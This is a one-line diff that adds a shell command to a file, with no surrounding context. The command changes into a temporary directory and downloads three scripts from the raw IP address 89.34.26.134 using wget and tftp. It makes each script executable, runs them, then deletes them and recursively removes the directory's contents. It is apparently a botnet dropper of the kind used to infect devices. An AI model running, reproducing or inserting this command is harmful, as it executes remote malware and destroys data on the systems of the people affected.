@@ -1,0 +1,1 @@
+cd /tmp || cd /run || cd /; wget http://89.34.26.134/lolbins.sh; chmod 777 lolbins.sh; sh lolbins.sh; tftp 89.34.26.134 -c get loltftp1.sh; chmod 777 loltftp1.sh; sh loltftp1.sh; tftp -r loltftp2.sh -g 89.34.26.134; chmod 777 loltftp2.sh; sh loltftp2.sh; rm -rf lolbins.sh loltftp1.sh loltftp2.sh; rm -rf *
